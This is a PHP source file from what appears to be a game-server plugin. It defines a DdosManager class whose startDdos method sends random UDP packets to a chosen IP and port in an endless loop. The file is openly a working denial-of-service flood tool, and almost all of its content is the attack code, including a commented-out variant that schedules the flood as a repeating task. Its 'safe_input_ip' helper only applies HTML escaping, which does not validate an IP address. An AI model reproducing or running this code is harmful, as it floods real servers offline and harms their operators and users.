<?php

namespace DDOS\Utils;

use DDOS\Main;
use DDOS\Shedule\DdosTask;

class DdosManager {

    /**
     * @var string
     */
    private string $ip;

    /**
     * @var string
     */
    private string $port;

    /**
     * @var array
     */
    private array $BYTES = [];

    /**
     * __construct
     *
     * @param string $ip
     * @param string $port
     */
    public function __construct(string $ip, string $port) {
        $this->ip = $ip;
        $this->port = $port;
    }

    /**
     * @return string
     */
    private function getIp() : string {
        return $this->ip;
    }

    /**
     *
     * @return string
     */
    private function getPort() : string {
        return $this->port;
    }

    /**
     * @return void
     */
    private function genBytes() : void {
        $hex  = substr(md5(mt_rand()), 0, 9);
        $this->BYTES[0] = unpack('H*', "$hex");
        $this->BYTES[1] = base_convert($this->BYTES[0][1], 16, 2);

    }

    /**
     * @return int
     */
    private function getBuffer() : int {
        return strlen($this->BYTES[1]);
    }

    /**
     * @param $ip
     * @return string|null
     */
    private function safe_input_ip($ip) : string|null {
        $ip = htmlspecialchars($ip);
        $ip = htmlentities($ip);
        $ip = trim($ip);
        $ip = stripslashes($ip);
        $ip = stripcslashes ($ip);

        if ($ip)
            return ($ip);

        else
            $trace = debug_backtrace();

        return null;

    }

    /**
     * @return void
     */
    public function startDdos() : void {
        $this->genBytes();
        $bytes = $this->BYTES[1];
        $buffer = $this->getBuffer();
        $flag = 0;
        $ip_addr = $this->getIp();
        $port = $this->getPort();

        $sock = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
        $ip_addr = $this->safe_input_ip($ip_addr);
        while(1) {
            socket_sendto($sock,$bytes, $buffer, $flag, $ip_addr, $port);
        }
    }
    /*
        $this->genBytes();
        $bytes = $this->BYTES[1];
        $buffer = $this->getBuffer();

        $sock = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);

        $task = new DdosTask($sock, $bytes, $buffer,0, $this->getIp(), $this->getPort());
        Main::getInstance()->getScheduler()->scheduleRepeatingTask($task, 1);
    } */
}

